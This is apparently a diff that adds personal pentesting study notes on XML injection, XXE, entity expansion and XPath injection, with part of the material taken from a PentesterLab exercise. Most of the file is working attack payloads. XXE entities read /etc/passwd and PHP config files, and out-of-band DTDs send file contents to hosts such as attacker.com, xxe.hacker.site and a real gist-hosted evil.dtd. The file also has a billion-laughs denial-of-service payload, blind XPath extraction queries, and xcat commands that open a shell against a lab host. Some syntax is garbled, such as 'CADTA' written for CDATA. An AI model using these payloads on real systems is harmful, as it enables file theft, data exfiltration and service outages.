@@ -1,0 +1,523 @@
+XML tag injection
+XML external entities
+XMl expansion
+Xpath injection:::::::::::::::::::::::::::::::::::::::
+
+If either updating his profile or during registration process ,joe is able to inject some xml metacharacters
+within the document . Then ,if application fails to contextually validte ,it is vulnerable to
+xml Injection
+
+Metacharaters :::    
+
+' " < > & 
+
+we can also use like this <hi>
+
+For making injection payload please refer js file which is related to that login system :
+
+
+ranveer</name></user><user><rule>1</rule><name>l33t</name><username>l33t
+
+If sytem is blocking our requst then test which character is blocking and make payload according to his :::
+
+
+
+
+name=</name></user><user><rule
+>1<!--&user=--></rule
+><username>l33t&password=devd
+
+ 
+ 
+ 
+
+
+
+<?xml version="1.0"?>
+<!DOCTYPE message SYSTEM "message.dtd">
+<message>
+ <body>
+   super mario %sign;
+  </body>
+</message>
+
+
+message.dtd
+
+<!ENTITY sign "_suprecoll raveee">
+
+ 
+  
+  
+  We can also try to exploit xml parser to xss 
+  
+  <script><![CADTA[alert]]>(xss)</script>
+  
+  
+  
+  It is also possible to escape angualer parentheses 
+  
+  <![CADTA[<]]>script<![CADTA[>]]>
+             alert('xss')
+  <![CADTA[<]]>script<![CADTA[>]]>
+  
+  
+  
+  
+  
+  XMl external entities::::::::::::::::::::::::::::::
+
+
+  https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
+  
+  
+
+  <?xml version="1.0"?>
+  <!DOCTYPE message [
+    <!ENTITY ravi SYSTEM "http://attacker.com/ravi">
+	]>
+	
+	<sign>&ravi;</sign>
+	
+	
+	
+	::::::::::::URI schemes are ftp, file, dns, php :
+	
+	
+	
+	<!ENTITY xxxefile SYSTEM "file:///etc/passwd">
+	
+	
+	
+	
+	<?xml version="1.0"?>
+	<!DOCTYPE message [
+	<!ENTITY xxefile SYSTEM "file://etc/issue">
+	]>
+	<mysign>ranveer&xxefile;</mysign>
+	
+	
+	
+	
+	
+	
+	In addition to document entities, the specification provide Parameter Entities .
+	These are special entities to be used only within the dtd 
+	
+	parameter entity defination 
+	
+	<!ENTITY %name "value">
+	<!ENTITY %name "SYSTEM "URI">
+	<!ENTITY %name PUBLIC" "URI">
+	
+	
+	
+	
+	CADTA escape using parameter entities ::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+	----------------------------------------------------------------------------------------------------
+	<!DOCTYPE message [
+	   
+	    <!ENTITY %a "<![CADTA["><!ENTITY %xxefile SYSTEM "file://path/to/config.php""><!ENTITY %z "]]>">
+		<!ENTITY %extdtd SYSTEM "http://attacker.com/ravi/evil.dtd">
+		<!ENTITY join "%a;%xxefile;%z">
+		]
+		<message>	
+	            <body>&join;</body>
+		</message>
+		
+		
+		
+	---------------------------------------------------------------------------------------------------------	
+		
+		
+		php built in wrapper ::
+		
+	---------------------------------	
+		This is a kind of meta-wraper designed to convert the application filters to a stream at the
+		time of opening:::
+		
+		
+		
+		
+		php://filter/read=convert.base64-encode/resource=/path/to/config
+		
+		php://filter/read=convert.base64-encode/resource=/parameter
+		
+		
+		
+		
+	<!DOCTYPE message [
+	
+	   <!ENTITY xxefile SYSTEM "php://filter/read=convert.base64-encode/resource=path/to/config.php">
+	<message>
+	         
+			 <body>&xxefile;</body>
+			 :wq
+			 
+	</message>
+	
+	
+	
+	
+	OOB xxe ::::::::::::::::_------------------------------
+	
+	
+	
+	evil.dtd 
+	
+	__________________-----------------------------------__________________-----------------------------------_
+	
+	
+	
+	
+	<!ENTITY % file SYSTEM "file:///etc/issue">
+	<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://requestbin.net/r/12c34yy1?%file;'>">
+	%p2;
+	
+
+	
+	
+	
+	------------------
+	
+	
+	 evil_oob.dtd----------------
+	 
+	 <!ENTITY % resource SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/6/.letmepass.php">
+	 <!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://xxe.hacker.site:2108/?p=%resource;'>">
+	 
+	
+	------------------------------------------------------------------------------
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE 	login [
+<!ENTITY % dtd SYSTEM "https://gist.githubusercontent.com/ranveer421/909ac7e87430d7d31ace612686dfa22b/raw/2c698c23a7029abba8be76ae79c49607b08f13b5/evil.dtd">
+%dtd; ]>
+<login>
+<email>demouser1@peritustrainingschool.com</email>
+<password>&e1;</password>
+</login>
+	
+	
+	-----------------------------------------------
+	
+	
+	<?xmlversion='1.0'?>
+	<!DOCTYPE xxe[
+	<!ENTITY%EvilDTDSYSTEM'http://xxe.hacker.site/evil_oob.dtd'>
+	%EvilDTD;
+	%LoadOOBEnt;
+	%OOB;
+	]>
+	<login>
+	<username>XXEME</username>
+	<password>password</password>
+	</login>"
+	
+	
+	--------------------------------------------------------------------------------------------------------
+	
+	
+	
+	XML entitie expansion
+	
+	XEE
+	
+	main goal is DOS
+	
+	
+	
+	Billion laugh paylod is --------------------------------
+	
+	
+	
+	<!DOCTYPE login [
+        <!ENTITY PERSON "PERSON">
+        <!ELEMENT PERSON (#PCDATA)>
+        <!ENTITY PERSON1 "&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;&PERSON;">
+        <!ENTITY PERSON2 "&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;&PERSON1;">
+        <!ENTITY PERSON3 "&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;&PERSON2;">
+        <!ENTITY PERSON4 "&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;&PERSON3;">
+        <!ENTITY PERSON5 "&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;&PERSON4;">
+        <!ENTITY PERSON6 "&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;&PERSON5;">
+        <!ENTITY PERSON7 "&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;&PERSON6;">
+        <!ENTITY PERSON8 "&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;&PERSON7;">
+        <!ENTITY PERSON9 "&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;&PERSON8;">
+        <!ENTITY PERSON10 "&PERSON9;&PERSON9;&PERSON9;&PERSON9;&PERSON9;&PERSON9;&PERSON9;&PERSON9;&PERSON9;&PERSON9;">
+	<!ENTITY PERSON11 "&PERSON10;&PERSON10;&PERSON10;&PERSON10;&PERSON10;&PERSON10;&PERSON10;&PERSON10;&PERSON10;&PERSON10;">
+	<!ENTITY PERSON12 "&PERSON11;&PERSON11;&PERSON11;&PERSON11;&PERSON11;&PERSON11;&PERSON11;&PERSON11;&PERSON11;&PERSON11;">
+        ]>
+		
+		
+	<body>&PERSON12;<body>
+		
+-------------------------------------------------------------------------------------------------------------------------------		
+	Quadratic Blowup attack payload is :::::---------------------
+	
+	
+	
+	
+	
+	XPath 1.0   XPath 2.0
+	
+	Xpath specific injection ;; 
+	
+	true()
+	false(0
+	and 1=1
+	or 1=2
+
+
+Xpath 2.0 specific injection ---
+
+
+
+	lower-case(A)=a
+	
+	upper-case(a)=A
+	
+	
+	
+	______________________-----------------------------------------------
+	
+	
+	for testing ----
+	
+	
+	and count(/*)=1             ----------this mean there is only one element in root node 
+	
+	
+	and count(/*[1]/*)=2        ----------this mean two element in root node 
+	
+	
+	
+	and count(/*[1]/*[1]/*)
+	and count(/*[1]/*[2]/*)
+	
+	
+	if we want to find node name then use substring function ;;;;;;;;
+	test each characterone by one ;;;
+	
+	
+	for first character------
+	
+	and substring(name(/*[1]/*[1]/*[1]/*[1],1,1)='a' 
+	
+	for second character -----
+	
+	
+	and substring(name(/*[1]/*[1]/*[1]/*[1],2,1)='a'
+	
+	
+	for third character--------
+	
+	and substring(name(/*[1]/*[1]/*[1]/*[1],3,1)='a'
+	
+	
+	
+	
+	For fast find character other useful function xpath2.0 is 
+	
+	adopt this method we can speed up process ---
+	
+	
+	
+	string-to-codepoints
+	
+	
+	and string-to-codepoints(substring(name(/*[1]/*[1]/*[1]/*[1],1,1))=100
+	
+	
+	codeponts.net for cheking
+	
+	
+	For OOB in Xpath use doc function ;;;;
+	
+	
+	and doc('http://hacker.site/ranveer')
+	
+	
+	this make request the hacker.site for ranveer
+	
+	
+	For finding  node in xml document we use concate function 
+	
+	
+	
+	
+	and doc(concate('http://hacker.site','value/','value2/'))
+	
+	
+	this request  hacker site for value1 and value2
+	
+	
+	for findin element in document 
+	
+	and doc(concate('http://hacker.site',name(/*))
+	
+	
+	This give the root element in document
+	
+	for next element in root 
+	
+	and doc(concat('http://hacker.site',name(/*[1]/*[1]))
+	
+	
+	
+	
+	
+	for second element in root 
+	
+	
+	and doc(concat("http://hacker.site",name(/*[1]/*[2]))
+	
+	
+	and like this you can find more element in other 
+	
+	
+	
+	for encoding in uri we use encode-for-uri function '''
+	
+	
+	and doc(concat("http://hacker.site",encode-for-uri(name(/*[1])))
+	
+	
+	
+	If theere is waf or any blacklisting then http is completey forbidden 
+	we can use dns technique''
+	
+	
+	and doc(concat('http://',nmae(/*),'.','_.hacker.site'))
+	
+	
+	
+	
+	
+	
+	
+	
+	===============xcat commands++++++++++++++++
+	==============================================
+	===================================================
+	=======================================
+	==============================================
+	
+	
+	TO get xml document::::
+	
+	
+	
+	xcat run -m GET http://ptl-72f5bcf7-a103474e.libcurl.so name name=hacker password=pentesterlab --true-string=hacker
+	
+	
+	
+	
+	To get shelll :::::::
+	
+	
+	
+	xcat shell -m GET http://ptl-72f5bcf7-a103474e.libcurl.so name name=hacker password=pentesterlab --true-string=hacker
+	
+	
+	
+	To detect vulnerablity:::::
+	
+	
+	
+	xcat detect -m GET http://ptl-72f5bcf7-a103474e.libcurl.so name name=hacker password=pentesterlab --true-string=hacker
+	
+	==================================================================================
+	=====================================================================================
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	XPath 2.0  
+	
+	most segnificant keyword is SEQUENCE,upper-case,lower-case,
+	
+	
+	base-uri is a function usefule in detecting properties about uris;
+	
+	
+	for example calling this function without passing any argument us to potentially
+	obtain the full uri path of the current file :
+	
+	
+base-uri()
+
+
+
+   for keyword
+    for $x in employee/ramm return $x/username
+	
+	
+	if keyword:
+	
+	   if ($employee/role = 2)
+	   then $employee
+	   else 
+	   
+	   
+	Another usefule improvement involves the ablity to use Regular Expression syntex for pattren matching using the key 
+	
+	
+	keyword matches replace tokenize 
+	
+	codepoints-to-string
+	string-to-codepoints
+	
+	error() raise an error and never returs a value 
+	
+	
+	Xpath realy powerful feture:  doc($uri)
+	
+	(substring((doc('file:///protected/secret.xml')/*[1]/*[1]/text()[1]),3,1))) < 127
+	
+	
+	doc(concat("http://attacker.com/oob",/Employee/Employee/[1]/username
+	
+	
+	doc(concat("http://attacker.com/oob",encode-for-uri(/Employee/Employee/[1]/username))
+	
+	
+	
+PENTESTER lab pro xpath injection _=============================
+===============================================================
+
+
+
+ In this example, the code uses the user's input, inside an XPath expression. XPath is a query language, which selects nodes from an XML document. Imagine the XML document as a database, and XPath as an SQL query. If you can manipulate the query, you will be able to retrieve elements to which you normally should not have access.
+
+ If we inject a single quote, we can see the following error:
+
+ Warning: SimpleXMLElement::xpath(): Invalid predicate in /var/www/index.php on line 22
+ Warning: SimpleXMLElement::xpath(): xmlXPathEval: evaluation failed in /var/www/index.php on line 22
+ Warning: Variable passed to each() is not an array or object in /var/www/index.php on line 23
+
+ Just like SQL injection, XPath allows you to do boolean logic, and you can try:
+
+   --> ' and '1'='1 and you should get the same result.
+   --> ' or '1'='0 and you should get the same result.
+   --> ' and '1'='0 and you should not get any result.
+   --> ' or '1'='1 and you should get all results.
+
+ Based on these tests and previous knowledge of XPath, it's possible to get an idea of what the XPath expression looks like:
+
+ [PARENT NODES]/name[.='[INPUT]']/[CHILD NODES]
+
+ To comment out the rest of the XPath expression, you can use a NULL BYTE (which you will need to encode as %00). As we can see in the XPath expression above, we also need to add a ] to properly complete the syntax. Our payload now looks like hacker']%00 (or hacker' or 1=1]%00 if we want all results).
+
+ If we try to find the child of the current node, using the payload '%20or%201=1]/child::node()%00, we don't get much information.
+
+ Here, the problem is that we need to get back up in the node hierarchy, to get more information. In XPath, this can be done using parent::* as part of the payload. We can now select the parent of the current node, and display all the child node using hacker'%20or%201=1]/parent::*/child::node()%00.
+
+ One of the node's value looks like a password. We can confirm this, by checking if the node's name is password using the payload hacker']/parent::*/password%00.	
+	
